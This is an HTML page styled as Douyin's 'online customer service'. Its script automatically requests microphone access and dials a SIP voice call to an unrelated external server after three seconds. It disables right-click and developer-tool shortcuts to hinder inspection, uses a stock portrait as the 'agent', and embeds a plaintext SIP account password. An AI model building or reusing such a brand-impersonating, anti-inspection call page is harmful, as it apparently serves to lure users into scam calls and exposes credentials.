<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>在线客服</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }
    .logo-box {
      text-align: center;
      margin-top: 50px;
    }
    .logo-box img {
      width: 100px;
      height: 100px;
    }
    .main-content {
      text-align: center;
      margin-top: 30px;
    }
    .main-content h1 {
      font-size: 2rem;
      color: #333;
    }
    .profile-avatar {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      margin: 20px 0;
    }
    button {
      padding: 20px 60px;
      font-size: 1.4rem;
      cursor: pointer;
      border-radius: 10px;
      border: none;
      margin: 10px;
      background-color: #007bff;
      color: white;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      transition: background-color 0.3s, transform 0.3s;
      width: 200px;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    button:hover:not(:disabled) {
      background-color: #0056b3;
      transform: translateY(-2px);
    }
    button:active:not(:disabled) {
      background-color: #004085;
      transform: translateY(0);
    }
    #callStatus {
      font-size: 1.5rem;
      color: #333;
      margin-top: 20px;
    }
    .footer {
      text-align: center;
      font-size: 1rem;
      color: #777;
      margin-top: 40px;
    }
    @media (max-width: 768px) {
      .logo-box img {
        width: 80px;
        height: 80px;
      }
      .main-content h1 {
        font-size: 1.5rem;
      }
      .profile-avatar {
        width: 80px;
        height: 80px;
      }
      button {
        padding: 15px 40px;
        font-size: 1.2rem;
        width: 160px;
      }
      #callStatus {
        font-size: 1.2rem;
      }
    }
  </style>
</head>
<body>
  <div class="logo-box">
    <img src="https://img.alicdn.com/imgextra/i4/O1CN01dnivBF1N5RSFx2Jfa_!!6000000001533-2-tps-200-200.png" alt="抖音LOGO" />
  </div>
  <div class="main-content">
    <h1>在线客服</h1>
    <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
    <!-- 呼叫按钮隐藏，自动拨号 -->
    <!-- <button id="callButton" style="display:none;">📞 呼叫客服</button> -->
    <button id="hangupButton" disabled>🛑 挂断</button>
    <div id="callStatus">未呼叫</div>
    <audio id="audioRemote" autoplay></audio>
  </div>
  <div class="footer">
    <!-- 这里可以填写底部版权或其他信息 -->
  </div>

  <!-- 本地引用，确保这两个JS文件放在服务器 /js 目录 -->
  <script src="/js/adapter-latest.js"></script>
  <script src="/js/jssip.min.js"></script>

  <script>
    // 禁用右键和F12等开发者工具快捷键
    document.addEventListener('contextmenu', e => {
      e.preventDefault();
      alert('右键功能已禁用');
    });
    document.onkeydown = function (e) {
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i') ||
        (e.ctrlKey && e.key.toLowerCase() === 'u')
      ) {
        alert('开发者工具已禁用');
        return false;
      }
    };

    document.addEventListener('DOMContentLoaded', () => {
      const hangBtn = document.getElementById('hangupButton');
      const statusDisplay = document.getElementById('callStatus');
      const remoteAudio = document.getElementById('audioRemote');

      let session = null;
      let isCalling = false;

      function updateStatus(text, color = '#333') {
        statusDisplay.textContent = text;
        statusDisplay.style.color = color;
      }

      const socket = new JsSIP.WebSocketInterface('wss://123.xin.anjre.cn:8089/ws');
      const configuration = {
        sockets: [socket],
        uri: 'sip:1001@123.xin.anjre.cn',
        password: 'Aa6363463@',
        display_name: '网页客户',
        session_timers: false,
        register: true
      };

      const ua = new JsSIP.UA(configuration);

      ua.on('connected', () => console.log('✅ WebSocket 已连接'));
      ua.on('disconnected', () => console.warn('WebSocket 已断开'));
      ua.on('registrationFailed', e => console.error('注册失败:', e));
      ua.on('registered', () => console.log('✅ 注册成功'));

      ua.on('newRTCSession', e => {
        console.log('新会话事件触发');
        session = e.session;

        session.on('peerconnection', (e) => {
          const pc = e.peerconnection;
          pc.ontrack = (evt) => {
            console.log('收到远端媒体流');
            if (evt.streams && evt.streams[0]) {
              remoteAudio.srcObject = evt.streams[0];
              remoteAudio.play().catch(console.warn);
            }
          };
        });

        session.on('progress', () => updateStatus('振铃中...', '#ffa500'));
        session.on('accepted', () => updateStatus('通话中', 'green'));
        session.on('ended', () => {
          updateStatus('通话结束', '#333');
          resetUI();
        });
        session.on('failed', e => {
          updateStatus('通话失败', 'red');
          console.error('会话失败', e);
          resetUI();
        });
      });

      async function makeCall() {
        if (isCalling) return;
        try {
          updateStatus('请求麦克风权限...', '#007bff');
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          updateStatus('麦克风权限已获取，开始拨号...', '#007bff');
        } catch (err) {
          alert('请允许使用麦克风才能与客服通话。');
          console.error('麦克风权限拒绝:', err);
          updateStatus('麦克风权限被拒绝', 'red');
          return;
        }
        isCalling = true;
        hangBtn.disabled = false;

        console.log('开始拨号...');
        session = ua.call('sip:8008@123.xin.anjre.cn', {
          mediaConstraints: { audio: true, video: false },
          rtcOfferConstraints: { offerToReceiveAudio: 1, offerToReceiveVideo: 0 }
        });

        if (!session) {
          updateStatus('拨号失败，未创建会话', 'red');
          isCalling = false;
          hangBtn.disabled = true;
        }
      }

      function hangupCall() {
        if (!isCalling) return;
        hangBtn.disabled = true;
        updateStatus('挂断中...', '#666');
        if (session) session.terminate();
      }

      function resetUI() {
        isCalling = false;
        hangBtn.disabled = true;
        updateStatus('未呼叫', '#333');
        session = null;
      }

      hangBtn.addEventListener('click', hangupCall);
      hangBtn.addEventListener('touchend', e => { e.preventDefault(); hangupCall(); });

      // 3秒倒计时自动拨号
      let countdown = 3;
      const countdownInterval = setInterval(() => {
        if (countdown > 1) {
          countdown--;
          updateStatus(`${countdown}秒后自动拨号...`, '#555');
        } else {
          clearInterval(countdownInterval);
          makeCall();
        }
      }, 1000);

      ua.start();

      document.addEventListener('visibilitychange', () => {
        if (document.hidden) alert('请保持页面前台以确保通话顺畅');
      });
    });
  </script>
</body>
</html>
